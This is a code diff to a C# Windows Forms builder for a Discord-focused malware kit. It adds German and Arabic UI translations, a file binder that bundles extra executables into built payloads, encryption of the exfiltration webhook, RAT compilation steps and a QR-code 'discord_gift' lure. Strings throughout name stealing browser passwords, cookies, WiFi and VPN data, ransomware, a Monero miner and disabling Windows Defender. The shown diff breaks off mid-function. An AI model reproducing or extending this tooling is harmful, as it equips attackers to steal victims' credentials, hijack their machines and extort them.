+            shNo.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            btnUpdates.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            btnUpdates.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            fixButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            fixButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            englishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            englishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            russianButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            russianButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            frenchButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            frenchButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            polishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            polishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            spanishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            spanishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            turkishButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            turkishButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            germanButton.ForeColor = Color.Gainsboro;
+            germanButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            germanButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            arabicButton.ForeColor = Color.Gainsboro;
+            arabicButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            arabicButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            binderButton.ForeColor = Color.Gainsboro;
+            binderButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            binderButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            button11.ForeColor = Color.Gainsboro;
+            button11.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            button11.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            button9.ForeColor = Color.Gainsboro;
+            button9.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            button9.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            button10.ForeColor = Color.Gainsboro;
+            button10.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            button10.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            button12.ForeColor = Color.Gainsboro;
+            button12.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            button12.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            button13.ForeColor = Color.Gainsboro;
+            button13.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            button13.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            wizardBox.ForeColor = Color.Gainsboro;
+            desBox.ForeColor = Color.Gainsboro;
+            label55.ForeColor = Color.Gainsboro;
+            label48.ForeColor = Color.Gainsboro;
+            label49.ForeColor = Color.Gainsboro;
+            label58.ForeColor = Color.Gainsboro;
+            label59.ForeColor = Color.Gainsboro;
+            label64.ForeColor = Color.Gainsboro;
+            fakesButton.ForeColor = Color.Gainsboro;
+            fakesButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            fakesButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            backButton.ForeColor = Color.Gainsboro;
+            backButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
+            backButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
+            label69.ForeColor = Color.Gainsboro;
         }
 
         private string ynBtn = "yes";
@@ -1689,6 +1985,8 @@ namespace discordAIO6
             polishButton.FlatAppearance.BorderSize = 0;
             spanishButton.FlatAppearance.BorderSize = 0;
             turkishButton.FlatAppearance.BorderSize = 0;
+            germanButton.FlatAppearance.BorderSize = 0;
+            arabicButton.FlatAppearance.BorderSize = 0;
 
             translateLabel.Text = "null";
             translateLabel.ForeColor = Color.FromArgb(5, 5, 5);
@@ -1823,6 +2121,8 @@ namespace discordAIO6
             polishButton.FlatAppearance.BorderSize = 0;
             spanishButton.FlatAppearance.BorderSize = 0;
             turkishButton.FlatAppearance.BorderSize = 0;
+            germanButton.FlatAppearance.BorderSize = 0;
+            arabicButton.FlatAppearance.BorderSize = 0;
 
             translateLabel.Text = "null";
             translateLabel.ForeColor = Color.FromArgb(5, 5, 5);
@@ -1957,6 +2257,8 @@ namespace discordAIO6
             polishButton.FlatAppearance.BorderSize = 0;
             spanishButton.FlatAppearance.BorderSize = 0;
             turkishButton.FlatAppearance.BorderSize = 0;
+            germanButton.FlatAppearance.BorderSize = 0;
+            arabicButton.FlatAppearance.BorderSize = 0;
 
             translateLabel.Text = "null";
             translateLabel.ForeColor = Color.FromArgb(5, 5, 5);
@@ -2091,6 +2393,8 @@ namespace discordAIO6
             polishButton.FlatAppearance.BorderSize = 1;
             spanishButton.FlatAppearance.BorderSize = 0;
             turkishButton.FlatAppearance.BorderSize = 0;
+            germanButton.FlatAppearance.BorderSize = 0;
+            arabicButton.FlatAppearance.BorderSize = 0;
 
             translateLabel.Text = "null";
             translateLabel.ForeColor = Color.FromArgb(5, 5, 5);
@@ -2225,6 +2529,8 @@ namespace discordAIO6
             polishButton.FlatAppearance.BorderSize = 0;
             spanishButton.FlatAppearance.BorderSize = 1;
             turkishButton.FlatAppearance.BorderSize = 0;
+            germanButton.FlatAppearance.BorderSize = 0;
+            arabicButton.FlatAppearance.BorderSize = 0;
 
             translateLabel.Text = "null";
             translateLabel.ForeColor = Color.FromArgb(5, 5, 5);
@@ -2359,6 +2665,8 @@ namespace discordAIO6
             polishButton.FlatAppearance.BorderSize = 0;
             spanishButton.FlatAppearance.BorderSize = 0;
             turkishButton.FlatAppearance.BorderSize = 1;
+            germanButton.FlatAppearance.BorderSize = 0;
+            arabicButton.FlatAppearance.BorderSize = 0;
 
             translateLabel.Text = "Tercüme: Rescore#3692";
             translateLabel.ForeColor = Color.DarkRed;
@@ -2485,6 +2793,278 @@ namespace discordAIO6
             refreshLanguage();
         }
 
+        private void germanButton_Click(object sender, EventArgs e)
+        {
+            englishButton.FlatAppearance.BorderSize = 0;
+            russianButton.FlatAppearance.BorderSize = 0;
+            frenchButton.FlatAppearance.BorderSize = 0;
+            polishButton.FlatAppearance.BorderSize = 0;
+            spanishButton.FlatAppearance.BorderSize = 0;
+            turkishButton.FlatAppearance.BorderSize = 0;
+            germanButton.FlatAppearance.BorderSize = 1;
+            arabicButton.FlatAppearance.BorderSize = 0;
+
+            translateLabel.Text = "null";
+            translateLabel.ForeColor = Color.FromArgb(5, 5, 5);
+
+            sthww = "Etwas ist schief gelaufen.";
+            red = "Rot";
+            green = "Grün";
+            blue = "Blau";
+            white = "Weiß";
+            lversion = "Ausführung:";
+            uicolor = "UI Farbe:";
+            susername = "Nutzername:";
+            cupdates = "Aktualisieren:";
+            language = "Sprache:";
+            settings = "Einstellungen";
+            lmain = "Zuhause";
+            additional = "Zusätzlich";
+            inspector = "Inspektor";
+            misc = "Sonstiges";
+            yes = "Ja";
+            no = "Nein";
+            check = "Überprüfen";
+            upload = "Hochladen";
+            licon = "Symbol";
+            build = "Bauen";
+            clone = "Klon";
+            generate = "Generieren";
+            fInfo = "Metadaten:";
+            none = "Keiner";
+            whcbe = "Webhook darf nicht leer sein!";
+            whvalid = "Webhook gültig.";
+            whinvalid = "Ungültiger Webhook.";
+            generateorclone = "Sie müssen Metadaten generieren oder klonen.";
+            pumpinfo = "Sie müssen die Größe der Ausgabedatei angeben!";
+            selectpumpsize = "Sie müssen die Größe der Pumpe auswählen.";
+            pumpedTo = "Datei gepumpt ";
+            whdeleted = "Webhook gelöscht.";
+            whfstop = "Webhook-Flooder gestoppt.";
+            whusmsempty = "Webhook, Name und Nachricht dürfen nicht leer sein!";
+            toomany = "Zu viele Anfragen.\nSpam verzögert.";
+            start = "Start";
+            stop = "Stop";
+            started = "Gestartet";
+            stopped = "Gestoppt";
+            cpuusage = "Wählen Sie die CPU-Auslastung aus.";
+            poolusrname = "Geben Sie Pool, Benutzername und Passwort an.";
+            compdone = "Zusammenstellung fertig.";
+            addcreated = "Zusätzliche Optionen erstellt. Kompilieren...";
+            savedas = "Gespeichert als ";
+            creatingadds = "Erstellen zusätzlicher Optionen...";
+            creatingfile = "Datei erstellen...";
+            openingexp = "Entdecker öffnen...";
+            tokencannotempt = "Token darf nicht leer sein!";
+            invalidtoken = "Ungültiges Token.";
+            tokendeleted = "Token gelöscht.";
+            disabled = "Deaktiviert";
+            enabled = "Ermöglicht";
+            unverified = "Unbestätigt";
+            verified = "Verifiziert";
+            nopass = "Keine Passwörter!";
+            nocookies = "Keine Kekse!";
+            nohistory = "Keine Geschichte!";
+            novpn = "Kein VPN!";
+            nowifinetwork = "Keine WLAN-Netzwerkdaten!";
+            nowifipass = "Keine WLAN-Passwörter";
+            lminer = "Bergmann";
+            filecreated = "Datei erstellt. Warten Sie mal...";
+            exportas = "Exportieren (als .txt)";
+            credentials = "Referenzen";
+            dName = "Name:";
+            dIP = "IP Adresse:";
+            dMAC = "MAC Adresse:";
+            dToken = "DC Token:";
+            dWin = "WIN Taste:";
+            embedcolor = "Farbe einbetten";
+            select = "Auswählen";
+            idle = "Leerlauf...";
+            delete = "Löschen";
+            pump = "Pumpe";
+            filepumper = "Dateipumper";
+            lusername = "Nutzername";
+            lmessage = "Nachricht";
+            floodercolor = "Flooder-Einbettungsfarbe";
+            whflooder = "Webhook-Flooder";
+            deletewh = "Webhook löschen";
+            deletetkn = "Token löschen";
+            safemode = "Sicherheitsmodus";
+            addsettings = "Zusätzliche Einstellungen";
+            fakeerror = "Gefälschter Fehler";
+            ltitle = "Titel";
+            customplugin = "Custom plugin";
+            lobfuscate = "Verschleiern";
+            rostart = "Run on startup";
+            disabledefender = "Deaktivieren Sie Windows Defender";
+            disablemanager = "Deaktivieren Sie den Task-Manager";
+            lbsod = "Blauer Bildschirm";
+            wbblocker = "Website-Blocker";
+            lhide = "Diebstahl verstecken";
+            ljumpscare = "Jumpscare";
+            disableinput = "Maus und Tastatur deaktivieren";
+            swindowskey = "Windows key stehlen";
+            spasswords = "Browser-Passwörter stehlen";
+            scookies = "Browser-Cookies stehlen";
+            svpnc = "VPN stehlen";
+            wifidata = "WLAN-Daten stehlen";
+            disableinternet = "Internet deaktivieren";
+            shistory = "Browserverlauf stehlen";
+            cminer = "Krypto-Miner";
+            lransomware = "Ransomware";
+            mpool = "Monero-Pool";
+            lpassword = "Passwort";
+            lusage = "CPU auslastung";
+            minerInstruction = "1. Richten Sie Ihren Pool ein (z. B. pool.minergate.com:443)\n2. Richten Sie Ihren Benutzernamen ein. Wenn Sie Minergate verwenden, geben Sie Ihre E-Mail-Adresse ein.\n3. So richten Sie die Variable zum Ändern des Kennworts für den Namen der Mitarbeiter ein.";
+            lrequire = "Installationsvoraussetzungen";
+            linstertt = "Token einfügen";
+            linstall = "Installieren";
+            pipinstall = "PIP installiert";
+            compile = "Kompilieren";
+            compilerat = "Kompilieren Sie RAT";
+            linsert = "Einfügung";
+            instruction2 = "1. Erstelle einen Discord-Bot und füge ihn deinem Server hinzu (mit Administratorrechten).\n2. Python3 installieren.\n3. Klicken Sie auf die Schaltfläche Installieren.\n4. Füge das Discord-Bot-Token ein und drücke die Schaltfläche Einfügen.\n5. Klicken Sie auf die Schaltfläche Ratte kompilieren.\n6. Kompilierte Ratte auf Website/Discord hochladen.\n7. Geben Sie die URL der kompilierten Ratte an.\n8. Überprüfen Sie Discord RAT auf der zusätzlichen Seite.\n\nBefehle befinden sich auf unserem Discord-Server.\nWenn Sie RAT nicht kompilieren können, deinstallieren Sie das enum34-Paket mit <py -m pip uninstall enum34>";
+            saveB = "Speichern";
+
+            refreshLanguage();
+        }
+
+        private void arabicButton_Click(object sender, EventArgs e)
+        {
+            englishButton.FlatAppearance.BorderSize = 0;
+            russianButton.FlatAppearance.BorderSize = 0;
+            frenchButton.FlatAppearance.BorderSize = 0;
+            polishButton.FlatAppearance.BorderSize = 0;
+            spanishButton.FlatAppearance.BorderSize = 0;
+            turkishButton.FlatAppearance.BorderSize = 0;
+            germanButton.FlatAppearance.BorderSize = 0;
+            arabicButton.FlatAppearance.BorderSize = 1;
+
+            translateLabel.Text = "SnooF#1066 :ترجمة";
+            translateLabel.ForeColor = Color.DarkRed;
+
+            sthww = "هناك خطأ ما.";
+            red = "احمر";
+            green = "اخضر";
+            blue = "ازرق";
+            white = "ابيض";
+            lversion = "الإصدار:";
+            uicolor = "لون واجهة المستخدم:";
+            susername = "إظهار اسم المستخدم:";
+            cupdates = "تفقد التحديث:";
+            language = "اللغات:";
+            settings = "إعدادات";
+            lmain = "رئيسي";
+            additional = "إضافي";
+            inspector = "مفتش";
+            misc = "متفرقات";
+            yes = "نعم";
+            no = "لا";
+            check = "فحص";
+            upload = "تحميل";
+            licon = "أيقونة";
+            build = "ابني";
+            clone = "انسخ";
+            generate = "انشاء";
+            fInfo = "البيانات الوصفية:";
+            none = "لا يوجد";
+            whcbe = "لا يمكن للويبهووك ان يكون فارغا!";
+            whvalid = "الويبهووك صحيح";
+            whinvalid = "الويبهووك خطأ";
+            generateorclone = "يجب عليك ان تنشئ او تنسخ البيانات الوصفية.";
+            pumpinfo = "تحتاج إلى توفير حجم الملف الناتج!";
+            selectpumpsize = "تحتاج إلى تحديد حجم التكبير.";
+            pumpedTo = "تكبير الملف إلى ";
+            whdeleted = "تم حذف الويبهووك.";
+            whfstop = "لقد توقف فلودر الويبهووك.";
+            whusmsempty = "لا يمكن أن يكون اسم و رسالة الويبهووك فارغين!";
+            toomany = "طلبات كثيرة جدًا.\nSpam متأخر.";
+            start = "بداية";
+            stop = "وقف";
+            started = "بدأ";
+            stopped = "توقف";
+            cpuusage = "حدد استخدام وحدة المعالجة المركزية.";
+            poolusrname = "وفر اسم و كلمة مرور البوول.";
+            compdone = "تم التجميع.";
+            addcreated = "تم إنشاء خيارات إضافية. جاري التحويل ...";
+            savedas = "تم الحفظ باسم ";
+            creatingadds = "جاري إنشاء خيارات إضافية ...";
+            creatingfile = "جاري إنشاء ملف ...";
+            openingexp = "جارٍ فتح المستكشف ...";
+            tokencannotempt = "لا يمكن أن يكون الرمز فارغًا!";
+            invalidtoken = "رمز غير صالح.";
+            tokendeleted = "تم حذف الرمز.";
+            disabled = "غير فعال";
+            enabled = "فعال";
+            unverified = "لم يتم التحقق منه";
+            verified = "تم التحقق";
+            nopass = "لا توجد كلمات مرور!";
+            nocookies = "لا يوجد كوكيز!";
+            nohistory = "لا يوجد تاريخ/هستوري!";
+            novpn = "!لا يوجد شبكة خاصة افتراضية";
+            nowifinetwork = "لا توجد بيانات شبكة الإنترنت!";
+            nowifipass = "لا توجد كلمات مرور الإنترنت!";
+            lminer = "التعدين";
+            filecreated = "تم إنشاء الملف. أرجو الإنتظار...";
+            exportas = "تصدير (بتنسيق txt.)";
+            credentials = "أوراق اعتماد";
+            dName = "اسم:";
+            dIP = "عنوان IP:";
+            dMAC = "عنوان ماك:";
+            dToken = "رمز DC:";
+            dWin = "مفتاح WIN:";
+            embedcolor = "تضمين اللون";
+            select = "اختار";
+            idle = "عاطل...";
+            delete = "حذف";
+            pump = "تكبير";
+            filepumper = "مكبر الملفات";
+            lusername = "اسم المستخدم";
+            lmessage = "رسالة";
+            floodercolor = "فلودر تضمين اللون";
+            whflooder = "فيضان الويبهووك";
+            deletewh = "حذف الويبهووك";
+            deletetkn = "حذف الرمز المميز";
+            safemode = "وضع الآمن";
+            addsettings = "إعدادات إضافية";
+            fakeerror = "خطأ مزيف";
+            ltitle = "عنوان";
+            customplugin = "البرنامج المساعد المخصص";
+            lobfuscate = "غامض";
+            rostart = "تشغيل عند بدء تشغيل الجهاز";
+            disabledefender = "تعطيل برنامج Windows Defender";
+            disablemanager = "تعطيل برنامج Task Manager";
+            lbsod = "شاشة زرقاء";
+            wbblocker = "مانع المواقع";
+            lhide = "إخفاء السارق";
+            ljumpscare = "قفز الذعر";
+            disableinput = "تعطيل الماوس ولوحة المفاتيح";
+            swindowskey = "سرقة مفتاح ويندوز";
+            spasswords = "سرقة كلمات مرور المتصفح";
+            scookies = "سرقة كوكيز المتصفح";
+            svpnc = "سرقة الشبكة الخاصة الإفتراضية";
+            wifidata = "سرقة كلمات مرور الإنترنت";
+            disableinternet = "تعطيل الإنترنت";
+            shistory = "سرقة محفوظات المتصفح";
+            cminer = "عامل منجم التشفير";
+            lransomware = "الفدية";
+            mpool = "تجمع مونيرو";
+            lpassword = "كلمة المرور";
+            lusage = "استخدام المعالج";
+            minerInstruction = "1. قم بإعداد البوول (مثل pool.minergate.com:443)\n2. قم بإعداد اسم المستخدم الخاص بك. إذا كنت تستخدم ماينر جيت، فاملأ عنوان بريدك الإلكتروني.\n3. لتهيئة العمال' تغيير اسم كلمة المرور المتغير.";
+            lrequire = "متطلبات التثبيت";
+            linstertt = "أدخل الرمز";
+            linstall = "ثبت";
+            pipinstall = "تم تثبيت PIP";
+            compile = "تجميع";
+            compilerat = "تجميع RAT";
+            linsert = "إدراج";
+            instruction2 = "1. قم بإنشاء بوت ديسكورد ، وأضفه إلى سيرفرك (بامتيازات المسؤول).\n2. ثبت python3.\n3. انقر على زر التثبيت.\n4. أدخل رمز بوت الديسكورد واضغط على زر إدراج.\n5.  تجميع RAT انقر على زر .\n6. تحميل الفئران المترجمة إلى website/discord.\n7. توفير عنوان url  بتجميع RAT الخاص.\n8. تحقق من Discord RAT في صفحة إضافية.\n\nالأوامر على خادم الخلاف لدينا على الدسكورد سيرفر.\nتجميع RAT إذا كنت لا تستطيع ,امحي enum34 من خلال <py -m pip uninstall enum34>";
+            saveB = "احفظ";
+
+            refreshLanguage();
+        }
+
         private void cloneButton_Click(object sender, EventArgs e)
         {
             try
@@ -2602,7 +3182,12 @@ namespace discordAIO6
                             text = text.Replace("%v3%", BuildPart);
                             text = text.Replace("%v4%", PrivatePart);
                             text = text.Replace("%Guid%", Guid.NewGuid().ToString());
-                            text = text.Replace("AIOwebhook", webhookBox.Text);
+
+                            string whText = webhookBox.Text;
+                            string encText = Encrypt(whText);
+
+
+                            text = text.Replace("AIOwebhook", encText);
                             buildingLabel.Text = filecreated;
                             string embedColor = embedBox.BackColor.ToArgb().ToString();
                             embedColor = embedColor.Remove(0, 1);
@@ -2765,6 +3350,51 @@ namespace discordAIO6
                             {
                                 text = text.Replace("//ourcoolfakesetup", "RunWizard();");
                             }
+                            if (desBox.Checked)
+                            {
+                                text = text.Replace("//fakedesexe", "RunDesudo();");
+                            }
+
+                            if (ifExe1)
+                            {
+                                text = text.Replace("%otutajembedone%", "true");
+                            }
+                            else
+                            {
+                                text = text.Replace("%otutajembedone%", "false");
+                            }
+                            if (ifExe2)
+                            {
+                                text = text.Replace("%otutajembedtwo%", "true");
+                            }
+                            else
+                            {
+                                text = text.Replace("%otutajembedtwo%", "false");
+                            }
+                            if (ifExe3)
+                            {
+                                text = text.Replace("%otutajembedthree%", "true");
+                            }
+                            else
+                            {
+                                text = text.Replace("%otutajembedthree%", "false");
+                            }
+                            if (ifExe4)
+                            {
+                                text = text.Replace("%otutajembedfour%", "true");
+                            }
+                            else
+                            {
+                                text = text.Replace("%otutajembedfour%", "false");
+                            }
+                            if (ifExe5)
+                            {
+                                text = text.Replace("%otutajembedfive%", "true");
+                            }
+                            else
+                            {
+                                text = text.Replace("%otutajembedfive%", "false");
+                            }
 
 
                             // Ransom
@@ -2782,7 +3412,7 @@ namespace discordAIO6
 
                             buildingLabel.Text = addcreated;
                             Thread.Sleep(500);
-                            if (Compiler.Compilation(text, saveFileDialog.FileName, obfuscationCheck, string.IsNullOrWhiteSpace(label38.Text) ? null : label38.Text))
+                            if (Compiler.Compilation(text, saveFileDialog.FileName, obfuscationCheck, string.IsNullOrWhiteSpace(label38.Text) ? null : label38.Text, ifExe1, ifExe2, ifExe3, ifExe4, ifExe5, exe1, exe2, exe3, exe4, exe5))
                             {
                                 buildingLabel.Text = savedas + saveFileDialog.FileName;
                                 PopupMessage(compdone);
@@ -2799,41 +3429,6 @@ namespace discordAIO6
 
         private const int Keysize = 256;
         private const int DerivationIterations = 1000;
-
-        // Do not touch
-        private protected static string dAIOPass = "zTj8SWKbamgzfHYWamRd2A24ZrtdWe";
-
-        public static string Decrypt(string cipherText)
-        {
-            var cipherTextBytesWithSaltAndIv = Convert.FromBase64String(cipherText);
-            var saltStringBytes = cipherTextBytesWithSaltAndIv.Take(Keysize / 8).ToArray();
-            var ivStringBytes = cipherTextBytesWithSaltAndIv.Skip(Keysize / 8).Take(Keysize / 8).ToArray();
-            var cipherTextBytes = cipherTextBytesWithSaltAndIv.Skip((Keysize / 8) * 2).Take(cipherTextBytesWithSaltAndIv.Length - ((Keysize / 8) * 2)).ToArray();
-            using (var password = new Rfc2898DeriveBytes(dAIOPass, saltStringBytes, DerivationIterations))
-            {
-                var keyBytes = password.GetBytes(Keysize / 8);
-                using (var symmetricKey = new RijndaelManaged())
-                {
-                    symmetricKey.BlockSize = 256;
-                    symmetricKey.Mode = CipherMode.CBC;
-                    symmetricKey.Padding = PaddingMode.PKCS7;
-                    using (var decryptor = symmetricKey.CreateDecryptor(keyBytes, ivStringBytes))
-                    {
-                        using (var memoryStream = new MemoryStream(cipherTextBytes))
-                        {
-                            using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
-                            {
-                                var plainTextBytes = new byte[cipherTextBytes.Length];
-                                var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
-                                memoryStream.Close();
-                                cryptoStream.Close();
-                                return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);
-                            }
-                        }
-                    }
-                }
-            }
-        }
 
         private void dAIOupload_Click(object sender, EventArgs e)
         {
@@ -3488,6 +4083,8 @@ namespace discordAIO6
 
         private void ratCompileButton_Click(object sender, EventArgs e)
         {
+            string desktopP = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
             Process compileRAT = new Process();
             compileRAT.StartInfo.FileName = @"cmd.exe";
             compileRAT.StartInfo.WorkingDirectory = aioDir;
@@ -3503,7 +4100,14 @@ namespace discordAIO6
             }
             catch { }
 
-            PopupMessage("Discord RAT compiled.\n[%AppData%/Discord AIO/dist]\nPlease follow the instructions.");
+            File.Delete(aioDir + "\\DiscordRAT.spec");
+            File.Move(aioDir + "\\dist\\DiscordRAT.exe", desktopP + "\\DiscordRAT.exe");
+
+            PopupMessage("Discord RAT compiled.\n[It is placed on your desktop]\nPlease follow the instructions.");
+
+            Directory.Delete(aioDir + "\\__pycache__", true);
+            Directory.Delete(aioDir + "\\build", true);
+            Directory.Delete(aioDir + "\\dist", true);
         }
 
         private void saveButton_Click(object sender, EventArgs e)
@@ -3544,6 +4148,7 @@ namespace discordAIO6
             btnInventory.Show();
 
             qrButton.Hide();
+            binderButton.Hide();
             pnlNav.Height = btnDashboard.Height;
             pnlNav.Top = btnDashboard.Top;
             pnlNav.Left = btnDashboard.Left;
@@ -3551,6 +4156,7 @@ namespace discordAIO6
 
             navLabel.Text = lmain;
 
+            binderSite.Hide();
             qrSite.Hide();
             settingsSite.Hide();
             additionalSite.Hide();
@@ -3560,6 +4166,7 @@ namespace discordAIO6
             ratSite.Hide();
             mainSite.Show();
             qrButton.BackColor = Color.FromArgb(8, 8, 8);
+            binderButton.BackColor = Color.FromArgb(8, 8, 8);
             ratButton.BackColor = Color.FromArgb(8, 8, 8);
             btnParty.BackColor = Color.FromArgb(8, 8, 8);
             btnWork.BackColor = Color.FromArgb(8, 8, 8);
@@ -3582,6 +4189,7 @@ namespace discordAIO6
             btnInventory.Hide();
 
             qrButton.Show();
+            binderButton.Show();
 
 
 
@@ -3607,6 +4215,7 @@ namespace discordAIO6
             miscSite.Hide();
             minerSite.Hide();
             ratSite.Hide();
+            binderSite.Hide();
             qrSite.Show();
 
         }
@@ -3632,6 +4241,7 @@ namespace discordAIO6
             miscSite.Hide();
             minerSite.Hide();
             ratSite.Hide();
+            binderSite.Hide();
             qrSite.Show();
         }
 
@@ -3663,13 +4273,22 @@ namespace discordAIO6
 
         private void qrStartBtn_Click(object sender, EventArgs e)
         {
+            string desktopP = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
             Process requreInstall = new Process();
             requreInstall.StartInfo.FileName = @"cmd.exe";
             requreInstall.StartInfo.WorkingDirectory = aioDir + "\\QRGrabber";
             requreInstall.StartInfo.Arguments = "/K py QR_Generator.py";
             requreInstall.StartInfo.UseShellExecute = false;
             requreInstall.Start();
+            this.Opacity = 0.7;
+            if (File.Exists(desktopP + "\\discord_gift.png"))
+            {
+                File.Delete(desktopP + "\\discord_gift.png");
+            }
+            File.Copy(aioDir + "\\QRGrabber\\discord_gift.png", desktopP + "\\discord_gift.png");
             requreInstall.WaitForExit();
+            this.Opacity = 1.0;
         }
 
         private void fixButton_Click(object sender, EventArgs e)
@@ -3704,6 +4323,173 @@ namespace discordAIO6
                 }
                 catch { }
             }
+        }
+
+        private void binderButton_Click(object sender, EventArgs e)
+        {
+            pnlNav.Height = binderButton.Height;
+            pnlNav.Top = binderButton.Top;
+            pnlNav.Left = binderButton.Left;
+            binderButton.BackColor = Color.FromArgb(11, 11, 11);
+            qrButton.BackColor = Color.FromArgb(8, 8, 8);
+
+            navLabel.Text = "File binder";
+
+            mainSite.Hide();
+            settingsSite.Hide();
+            additionalSite.Hide();
+            inspectorSite.Hide();
+            miscSite.Hide();
+            minerSite.Hide();
+            ratSite.Hide();
+            qrSite.Hide();
+            binderSite.Show();
+        }
+
+        private void binderButton_Leave(object sender, EventArgs e)
+        {
+            binderButton.BackColor = Color.FromArgb(8, 8, 8);
+        }
+
+        // em1
+        private void button11_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog binderDialog = new OpenFileDialog();
+            binderDialog.Filter = "Executable (*.exe)|*.exe";
+            binderDialog.Title = "Select file to bind";
+
+            if (binderDialog.ShowDialog() == DialogResult.OK)
+            {
+                label56.Text = binderDialog.FileName;
+                label56.ForeColor = Color.DarkRed;
+                string path = Path.GetFullPath(binderDialog.FileName);
+                exe1 = path;
+                ifExe1 = true;
+            }
+        }
+
+        // em2
+        private void button9_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog binderDialog = new OpenFileDialog();
+            binderDialog.Filter = "Executable (*.exe)|*.exe";
+            binderDialog.Title = "Select file to bind";
+
+            if (binderDialog.ShowDialog() == DialogResult.OK)
+            {
+                label60.Text = binderDialog.FileName;
+                label60.ForeColor = Color.DarkRed;
+                string path = Path.GetFullPath(binderDialog.FileName);
+                exe2 = path;
+                ifExe2 = true;
+            }
+        }
+
+        // em3
+        private void button10_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog binderDialog = new OpenFileDialog();
+            binderDialog.Filter = "Executable (*.exe)|*.exe";
+            binderDialog.Title = "Select file to bind";
+
+            if (binderDialog.ShowDialog() == DialogResult.OK)
+            {
+                label61.Text = binderDialog.FileName;
+                label61.ForeColor = Color.DarkRed;
+                string path = Path.GetFullPath(binderDialog.FileName);
+                exe3 = path;
+                ifExe3 = true;
+            }
+        }
+
+        // em4
+        private void button12_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog binderDialog = new OpenFileDialog();
+            binderDialog.Filter = "Executable (*.exe)|*.exe";
+            binderDialog.Title = "Select file to bind";
+
+            if (binderDialog.ShowDialog() == DialogResult.OK)
+            {
+                label62.Text = binderDialog.FileName;
+                label62.ForeColor = Color.DarkRed;
+                string path = Path.GetFullPath(binderDialog.FileName);
+                exe4 = path;
+                ifExe4 = true;
+            }
+        }
+
+        // em5
+        private void button13_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog binderDialog = new OpenFileDialog();
+            binderDialog.Filter = "Executable (*.exe)|*.exe";
+            binderDialog.Title = "Select file to bind";
+
+            if (binderDialog.ShowDialog() == DialogResult.OK)
+            {
+                label63.Text = binderDialog.FileName;
+                label63.ForeColor = Color.DarkRed;
+                string path = Path.GetFullPath(binderDialog.FileName);
+                exe5 = path;
+                ifExe5 = true;
+            }
+        }
+
+        private static byte[] Generate256BitsOfRandomEntropy()
+        {
+            var randomBytes = new byte[32];
+            using (var rngCsp = new RNGCryptoServiceProvider())
+            {
+                rngCsp.GetBytes(randomBytes);
+            }
+            return randomBytes;
+        }
+
+        public static string Encrypt(string plainText)
+        {
+            var saltStringBytes = Generate256BitsOfRandomEntropy();
+            var ivStringBytes = Generate256BitsOfRandomEntropy();
+            var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
+            using (var password = new Rfc2898DeriveBytes("gqLmaLTWqhkWHvMSgRFaLRXdRgACznHz", saltStringBytes, DerivationIterations))
+            {
+                var keyBytes = password.GetBytes(Keysize / 8);
+                using (var symmetricKey = new RijndaelManaged())
+                {
+                    symmetricKey.BlockSize = 256;
+                    symmetricKey.Mode = CipherMode.CBC;
+                    symmetricKey.Padding = PaddingMode.PKCS7;
+                    using (var encryptor = symmetricKey.CreateEncryptor(keyBytes, ivStringBytes))
+                    {
+                        using (var memoryStream = new MemoryStream())
+                        {
+                            using (var cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
+                            {
+                                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
+                                cryptoStream.FlushFinalBlock();
